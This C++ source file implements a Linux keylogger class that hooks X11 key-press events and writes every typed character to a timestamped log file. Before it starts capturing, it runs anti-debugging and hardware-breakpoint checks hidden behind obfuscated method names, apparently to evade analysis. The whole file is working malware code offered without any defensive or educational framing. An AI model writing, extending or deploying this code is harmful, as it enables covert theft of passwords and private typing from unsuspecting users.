#include "../include/linuxLogger.h"
#include "../include/obfuscator.h"
#include "../include/antiDebug.h"

#include <iostream>
#include <stdexcept>
#include <sstream>
#include <fstream>
#include <string>
#include <memory>
#include <ctime>
#include <chrono>
#include <filesystem>

#if defined(__linux__)

LinuxLogger::LinuxLogger()
{
    logFilePath = generateLogFilePath();
    logFile.open(logFilePath, std::ios::app);
    if (!logFile.is_open())
    {
        throw std::ios_base::failure("Unable to access keystroke log file. Please make sure you have the correct permissions.");
    }

    display = XOpenDisplay(nullptr);
    if (!display)
    {
        throw std::runtime_error("Unable to open display.");
    }

    rootWindow = DefaultRootWindow(display);
    isRunning = true;
}

LinuxLogger::~LinuxLogger()
{
    if (display)
    {
        XCloseDisplay(display);
    }
    if (logFile.is_open())
    {
        logFile.close();
    }
}

void LinuxLogger::startLogging()
{
    AntiDebug ad;
    Obfuscator ob;

    ob.registerMethod<bool>("bpw", [&ad]() { return ad.isDebuggerPresent(); });
    if (ob.callMethod<bool>("bpw"))
    {
        throw std::runtime_error("Debugger detected. Exiting.");
    }

    ob.registerMethod<bool>("qqq", [&ad]() { return ad.checkForHardwareBreakpoints(); });
    if (ob.callMethod<bool>("qqq"))
    {
        throw std::runtime_error("Hardware breakpoints detected. Exiting.");
    }

    XEvent event;
    while (isRunning)
    {
        XNextEvent(display, &event);
        if (event.type == KeyPress)
        {
            handleKeyPress(&event.xkey);
        }
    }
}

void LinuxLogger::handleKeyPress(XKeyEvent* event)
{
    char key[255];
    KeySym keySym;
    int len = XLookupString(event, key, sizeof(key), &keySym, nullptr);
    if (len > 0)
    {
        if (keySym == XK_Return)
        {
            logFile << '\n';
        }
        else
        {
            logFile.write(key, len);
        }
        logFile.flush();
    }
}

std::string LinuxLogger::generateLogFilePath() const
{
    auto now = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
    std::tm tm = *std::localtime(&now);
    std::ostringstream oss;
    oss << "recordings_" << std::put_time(&tm, "%Y-%m-%d_%H-%M-%S") << ".log";
    return (std::filesystem::current_path() / oss.str()).string();
}

#endif
